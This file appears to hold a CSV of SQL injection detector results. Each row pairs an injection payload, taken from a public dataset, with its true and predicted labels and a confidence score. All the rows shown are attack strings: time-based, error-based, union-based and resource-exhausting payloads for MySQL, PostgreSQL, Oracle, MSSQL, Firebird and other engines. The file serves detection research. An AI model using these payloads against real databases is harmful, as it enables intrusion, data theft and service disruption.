text,source,true_label,pred_label,prob_sqli,correct
"1""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""fpkm"" like ""fpkm",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
-5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""aixs""  =  ""aixs",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"1   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
1'  )   where 3572  =  3572,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1%' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"1""  )   as rgod where 5766  =  5766 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"-9845""  )   as xpis where 1936  =  1936 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"-5644""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""evcf""  =  ""evcf",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"1""  )   where 1793  =  1793",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""ilrk""  =  ""ilrk",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )",sajid576/sql-injection-dataset,1,1,0.999993085861206,1
"1 union all select null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.9999916553497314,1
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"-5132%""   )    )    or 3038  =  3038",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
1'  )   rlike sleep  (  5  )   and   (  'tslp'  =  'tslp,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1   )    )    as tuxy where 6855  =  6855 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1%"" union all select null,null#",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"iif  (  3760  =  4785,1,1/0  )",sajid576/sql-injection-dataset,1,1,0.999993085861206,1
"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"-3729'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'czed'  =  'czed",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
-5152'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'jumr' like 'jumr,sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"1   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9184  =  9184",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"1' in boolean mode  )   union all select null,null--",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
select   (  case when   (  7019  =  1998  )   then 7019 else 7019*  (  select 7019 from mysql.db  )   end  )  #,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""vabm""  =  ""vabm",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1%"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"1'  )   where 1323  =  1323 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cwuy'  =  'cwuy",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
-2351   )    )    as xdqn where 4019  =  4019 or 8571  =  8571--,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1' where 5004  =  5004 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
select   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  select 2394 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1%""   )    )    and 2006  =  2006",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  1032,3623  )  --",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
1 and 5934  =  7745,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kird'  =  'kird",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"-1263""  )   or 9323  =  9323#",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'jicq' like 'jicq",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
1'+  (  select wpai where 3685  =  3685,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1""  )   where 2656  =  2656 or sleep  (  5  )  --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
1'  )   as twny where 9580  =  9580,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
select sleep  (  5  )   and 'gajm'  =  'gajm,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1 union all select null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.9999916553497314,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'wvzw'  =  'wvzw",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1%""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1""   )    )    as ajwe where 1153  =  1153 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
1'   )    )    as egsj where 3447  =  3447,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1"" and 5205  =  9975#",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'aezm' like 'aezm",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
1'||  (  select 'kuxp' where 7123  =  7123 and 1688  =  4200#,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",sajid576/sql-injection-dataset,1,1,0.999993085861206,1
"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1""  )   as jiiq where 6847  =  6847",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
1'   )    )    as qqvk where 1007  =  1007,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1%""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1""   )    )     )   union all select null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
1'  )   where 5378  =  5378,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"select * from generate_series  (  5206,5206,case when   (  5206  =  2214  )   then 1 else 0 end  )   limit 1--",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"-6007""   )    )    union all select 6019,6019,6019,6019,6019,6019,6019,6019--",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
-8234'   )    )     )   or 9323  =  9323#,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   1476  =  1476,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
1'   )    )    as iipj where 6560  =  6560,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'zypa'  =  'zypa",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1'   )    )    as icik where 1440  =  1440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"-3737%"" union all select 4452,4452,4452#",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
1 where 6036  =  6036 and 7533  =  7533--,sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"-6611%""   )    )     )   union all select 8918,8918#",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"-9156'   )    )    union all select 9110,9110,9110,9110#",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"-8640  )   or elt  (  7657  =  5020,5020  )   and   (  2346  =  2346",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"-2122""  )   as zytb where 7025  =  7025 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",sajid576/sql-injection-dataset,1,1,0.9999929666519165,1
"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
